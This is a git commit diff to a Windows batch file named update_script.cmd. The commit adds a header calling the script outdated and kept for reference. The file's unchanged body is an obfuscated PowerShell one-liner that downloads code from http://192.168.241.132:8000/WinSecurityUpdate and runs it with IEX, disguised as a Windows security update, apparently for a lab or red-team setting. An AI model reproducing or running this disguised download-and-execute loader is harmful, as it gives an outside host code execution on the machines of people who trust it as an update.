c38907945d3dc111e1fccd262b78d3720b3aeb1e
Daniel Lowrie <dlowrie290@yahoo.com>
2023-12-11 11:01:51 -0500

    Update update_script.cmd

--- update_script.cmd
+++ update_script.cmd
@@ -1,2 +1,6 @@
+THIS IS OLDER AND NO LONGER WORKS
+USE UpdateScript-v1.2.cmd
+JUST KEEPING THIS AROUND FOR REFERENCE
+======================================
 @ECHO OFF
 po""weR""sHelL -nO""p -c "iEx(New-Object Net.WEbclIent).DoWnLOadstRinG('http://192.168.241.132:8000/WinSecurityUpdate')"
